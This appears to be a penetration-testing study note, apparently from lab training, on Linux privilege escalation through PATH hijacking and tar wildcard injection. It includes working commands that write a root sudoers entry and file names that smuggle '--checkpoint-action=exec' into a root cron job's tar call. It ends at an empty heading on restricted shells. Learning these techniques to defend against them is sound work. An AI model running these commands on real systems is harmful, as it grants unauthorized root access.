# 🍯 Environment-based Privilege Escalation

[PATH](http://www.linfo.org/path\_env\_var.html) is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary.

```shell-session
echo $PATH
```

Creating a script or program in a directory specified in the PATH will make it executable from any directory on the system.

Adding `.` to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as `ls` with a malicious script such as a reverse shell. If we add `.` to the path by issuing the command `PATH=.:$PATH` and then `export PATH`, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing `ls)`

```shell-session
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

```shell-session
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls
htb_student@NIX02:~$ ls

PATH ABUSE!!
```

## Wildcard Abuse

A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions.\


<table data-header-hidden><thead><tr><th width="143"></th><th></th></tr></thead><tbody><tr><td><strong>Character</strong></td><td><strong>Significance</strong></td></tr><tr><td><code>*</code></td><td>An asterisk that can match any number of characters in a file name.</td></tr><tr><td><code>?</code></td><td>Matches a single character.</td></tr><tr><td><code>[ ]</code></td><td>Brackets enclose characters and can match any single one at the defined position.</td></tr><tr><td><code>~</code></td><td>A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.</td></tr><tr><td><code>-</code></td><td>A hyphen within brackets will denote a range of characters.</td></tr></tbody></table>

&#x20;the `tar` command, a common program for creating/extracting archives. In the man of the tar command we can see interesting stuff ->

```shell-session
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.)

Let's say we have a cron job, which is set up to back up the `/home/htb-student` directory's contents and create a compressed archive within `/home/htb-student`.

```shell-session
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.

```shell-session
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

Then once the cronjob runs we can look at our new sudo privileges:

```shell-session
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```

## Escaping Restricted Shells

\


\
